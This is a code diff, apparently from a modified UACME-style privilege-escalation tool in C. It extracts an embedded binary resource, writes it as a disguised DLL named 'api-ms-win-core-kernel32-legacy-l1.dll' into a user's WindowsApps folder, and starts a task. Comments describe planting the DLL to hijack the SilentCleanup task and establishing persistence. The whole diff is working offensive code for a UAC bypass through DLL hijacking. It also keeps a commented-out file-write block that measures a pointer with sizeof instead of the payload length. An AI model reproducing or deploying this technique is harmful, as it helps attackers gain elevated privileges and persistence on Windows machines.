@@ -614,17 +614,56 @@ UCM_API(MethodDebugObject)
         unsigned char* payload;
         unsigned int payload_len;
         res = FindResource(g_hInstance, MAKEINTRESOURCE(107), L"BIN"); // substitute RESOURCE_ID and RESOURCE_TYPE.
-
-
+        payload_len = SizeofResource(g_hInstance, res);
+  
 
         resHandle = LoadResource(g_hInstance, res);
-        payload = (unsigned char*)LockResource(resHandle);
-
-        payload_len = SizeofResource(g_hInstance, res);
 
 
+        payload = LockResource(resHandle);
+
+
+  
+
+        //LPCWSTR lpTempFileName = L"C:\\Users\\d\\Appdata\\Local\\Microsoft\\WindowsApps\\api-ms-win-core-kernel32-legacy-l1.dll";
+        //
+        //HANDLE hFile = CreateFile(lpTempFileName, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        ////hFile = CreateFileW(lpTempFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        //if (hFile == INVALID_HANDLE_VALUE)
+        //{
+        //    //PrintError(TEXT("Second CreateFile failed"));
+        //    if (!CloseHandle(hFile))
+        //    {
+        //        //PrintError(TEXT("CloseHandle(hFile) failed"));
+        //        return (7);
+        //    }
+        //    return (2);
+        //}
+        //DWORD dwWritten = 0;
+
+        ////copy to byte array
+
+        //unsigned char* bytes = supHeapAlloc(payload_len);
+        ////unsigned char* bytes = new unsigned char[dwSize];
+        //memcpy(bytes, payload, payload_len);
+
+        //unsigned int len = sizeof(bytes);
+
+        ////WriteF
+        //if (!WriteFile(hFile, bytes, len, &dwWritten, NULL)) {
+        //    if (!CloseHandle(hFile))
+        //    {
+        //        //PrintError(TEXT("CloseHandle(hFile) failed")); 
+        //        return (7);
+        //    }
+        //    return 3;
+        //}
+
+        //CloseHandle(hFile);
 
         writeFileToDisk(L"C:\\Users\\d\\Appdata\\Local\\Microsoft\\WindowsApps\\api-ms-win-core-kernel32-legacy-l1.dll", payload, payload_len);
+        ucmxStartTask();
+        
 
         //plant dll n run silentcleanup
         //establish non admin persistence
